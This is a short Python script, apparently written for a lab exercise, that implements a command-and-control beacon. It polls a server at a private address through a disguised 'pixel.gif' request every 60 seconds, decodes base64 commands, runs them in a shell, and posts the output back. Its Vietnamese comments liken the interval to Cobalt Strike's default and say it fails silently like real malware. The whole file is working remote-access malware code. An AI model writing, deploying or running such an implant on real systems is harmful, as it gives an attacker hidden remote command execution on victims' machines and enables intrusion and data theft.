import requests, subprocess, time, base64, uuid, random, os

C2  = "http://192.168.56.30:8080"
VID = str(uuid.uuid4())[:8]
INTERVAL = 60  # seconds — giống Cobalt Strike default

def beacon():
    try:
        r = requests.get(f"{C2}/pixel.gif", 
                         params={"id": VID}, 
                         timeout=10)
        if r.headers.get('Content-Type') == 'application/json':
            data = r.json()
            cmd  = base64.b64decode(data['cmd']).decode()
            out  = subprocess.check_output(cmd, shell=True, 
                                           stderr=subprocess.STDOUT)
            requests.post(f"{C2}/result", json={
                "id": VID,
                "output": base64.b64encode(out).decode()
            })
    except Exception as e:
        pass  # Silently fail như malware thật

if __name__ == '__main__':
    while True:
        beacon()
        time.sleep(INTERVAL)
                                                    
